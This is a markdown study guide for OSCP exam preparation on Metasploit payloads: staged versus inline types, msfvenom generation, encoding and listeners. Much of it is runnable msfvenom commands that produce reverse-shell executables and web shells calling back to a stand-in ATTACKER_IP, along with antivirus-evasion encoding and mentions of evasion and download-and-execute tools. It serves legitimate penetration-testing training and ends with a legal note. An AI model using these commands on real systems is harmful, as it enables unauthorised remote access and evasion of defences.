# Metasploit Payloads

Metasploit payloads are the components that execute after a successful exploit. This guide covers various payload types, generation, and usage in the OSCP exam.

## 📋 Table of Contents
1. [Payload Types](#payload-types)
2. [Generating Payloads](#generating-payloads)
3. [Staged vs Non-Staged](#staged-vs-non-staged)
4. [Payload Encoding](#payload-encoding)
5. [Handlers](#handlers)
6. [Practice](#-practice)

## Payload Types

### Inline (Non-Staged)
- Single, self-contained payload
- Larger in size
- More reliable
- Example: `windows/shell_reverse_tcp`

### Staged
- Small stager that downloads the actual payload
- Smaller initial payload
- Multiple network requests
- Example: `windows/shell/reverse_tcp`

### Meterpreter
- Advanced, feature-rich payload
- Extensible with extensions
- Stealthy (runs in memory)
- Example: `windows/meterpreter/reverse_tcp`

## Generating Payloads

### Basic Payload Generation
```bash
# Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe

# Linux reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > shell.elf

# Web payloads
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw > shell.jsp
```

### Output Formats
```bash
# Windows
-f exe -o shell.exe
-f dll -o shell.dll
-f vba -o shell.vba

# Web
-f raw -o shell.php
-f war -o shell.war
-f jsp -o shell.jsp

# Scripting
-f py -o shell.py
-f pl -o shell.pl
```

## Staged vs Non-Staged

### Non-Staged (Inline)
```bash
# Windows
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe

# Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > shell.elf
```

### Staged
```bash
# Windows
msfvenom -p windows/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell_staged.exe

# Linux
msfvenom -p linux/x86/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > shell_staged.elf
```

## Payload Encoding

### Basic Encoding
```bash
# List encoders
msfvenom -l encoders

# Encode a payload
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -f exe > encoded_shell.exe
```

### Multiple Encoding
```bash
# Multiple iterations of encoding
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > multi_encoded.exe
```

### Bad Character Avoidance
```bash
# Avoid specific characters
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -b "\x00\x0a\x0d" -f exe > badchars_avoided.exe
```

## Handlers

### Multi/Handler Module
```msf
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
exploit -j
```

### Manual Listener
```bash
# Netcat listener
nc -nvlp 4444

# Socat listener
socat TCP-LISTEN:4444 -
```

## 🛠 Tools

### Payload Generation
- **msfvenom**: Built-in Metasploit payload generator
- **Unicorn**: PowerShell attack tool
- **Veil**: AV-evasion framework
- **Shellter**: Dynamic shellcode injector

### Payload Delivery
- **SimpleHTTPServer**: Python web server
- **PowerShell WebClient**: Download and execute
- **TFTP**: For network transfers
- **SMB**: Windows file sharing

## 📚 Resources
- [Metasploit Unleashed - Payloads](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks - Payloads](https://book.hacktricks.xyz/shells/shells/)

## 🎯 Practice
1. Generate different types of payloads for various platforms
2. Test encoding and evasion techniques
3. Set up handlers for different payload types
4. Practice delivering payloads through different methods

## ⚠️ Legal Note
Only generate and use payloads on systems you own or have explicit permission to test. Unauthorized testing is illegal.
